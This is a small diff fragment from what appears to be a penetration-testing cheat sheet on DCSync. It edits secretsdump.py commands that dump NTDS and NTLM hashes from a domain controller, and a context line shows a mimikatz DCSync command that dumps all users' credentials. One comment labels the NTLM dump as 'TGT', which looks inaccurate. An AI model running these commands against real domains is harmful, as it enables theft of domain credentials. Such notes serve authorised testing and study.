@@ -68,6 +68,6 @@ lsadump::dcsync /domain:htb.local /all /csv     //dump all users
 ### Run remotely
 
 ```
-secretsdump.py -just-dc  <domain>/<DC user>@<DC IP>      //dump NTDS
-secretsdump.py -just-dc-ntlm <domain>/<DC user>@<DC IP>  //dump TGT
+secretsdump.py -just-dc         //dump NTDS
+secretsdump.py -just-dc-ntlm    //dump TGT
 ```
